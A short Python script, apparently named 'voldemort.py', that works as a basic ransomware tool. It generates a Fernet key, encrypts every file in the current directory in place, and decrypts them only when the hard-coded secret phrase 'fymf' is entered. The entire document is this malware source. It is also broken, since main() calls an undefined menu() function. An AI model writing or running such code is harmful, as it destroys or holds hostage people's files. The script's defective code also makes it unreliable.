import os
from cryptography.fernet import Fernet

E = "[-]"
S = "[+]"
I = "[*]"

def key():
    for file in os.listdir():
        if file == "thekey.key":
                print(f"{E} The key was generated!")
                return
    key = Fernet.generate_key()
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)
    print(f'{S} key generated!')

def encrypt():
    files = list()
    for file in os.listdir():
        if file  == "voldemort.py" or file == "thekey.key":
            continue
        if os.path.isfile(file):
            files.append(file)

    print(files)

    with open("thekey.key", "rb") as key:
        secretkey = key.read()

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(secretkey).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)

def decrypt():
    files = list()
    for file in os.listdir():
        if file  == "voldemort.py" or file == "thekey.key":
            continue
        if os.path.isfile(file):
            files.append(file)

    print(files)

    with open("thekey.key", "rb") as key:
        secretkey = key.read()

    secretphrase = "fymf"
    user_phrase = str(input(f'{I} Enter the secret phrase to decrypt your files\n>>>>>> '))
    if user_phrase == secretphrase:
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        print(f"{S} Your files are decrypred!")
    else:
        print(f"{E} Wrong secret phrase!")

def main():
    opt = ""
    while opt != "exit":
        opt = menu()
        if opt == "encrypt":
            encrypt()
        elif opt == "decrypt":
            decrypt()
        elif opt == "key":
            key()
        else:
            print(f'{I} Enjoy your life!')

main()
